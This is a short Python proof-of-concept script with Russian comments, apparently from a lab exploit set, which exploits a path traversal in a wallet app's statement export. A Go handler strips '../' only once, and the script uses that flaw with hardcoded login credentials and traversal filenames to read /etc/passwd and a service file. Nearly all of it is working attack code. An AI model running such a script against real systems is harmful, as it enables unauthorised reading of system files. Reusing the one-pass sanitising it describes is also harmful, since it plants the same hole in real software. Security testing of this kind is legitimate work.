# -*- coding: utf-8 -*-
"""V-07. Path traversal в выгрузке выписки.

handlers_shop.go, statementExport: имя файла чистится однократным
  strings.Replace(name, "../", "", 1)
поэтому оставшиеся ../ доходят до filepath.Join и выводят за каталог exports.
Читаем произвольные файлы контейнера.
"""
from wallet_client import Client, parser, banner, ok, fail


def read(client, name):
    body = client.post_form("/statements/export", {"filename": name})[2]
    return body.decode("utf-8", "replace")


def main():
    a = parser("Path traversal в выписке").parse_args()
    c = Client(a.base)
    c.login("ivanov", "workplace1")
    c.get("/statements/export")

    passwd = read(c, "../../../../../../etc/passwd")
    if "root:x:0:0" not in passwd:
        fail("не удалось прочитать /etc/passwd")
    banner("/etc/passwd:")
    for line in passwd.splitlines()[:3]:
        banner("  " + line)

    note = read(c, "../../../../../../var/www/labdata/stmt_note.txt")
    if "STMT-INV" in note:
        banner("служебный файл /var/www/labdata/stmt_note.txt:")
        for line in note.splitlines():
            banner("  " + line)
    ok("произвольное чтение файлов через обход каталога подтверждено")


if __name__ == "__main__":
    main()
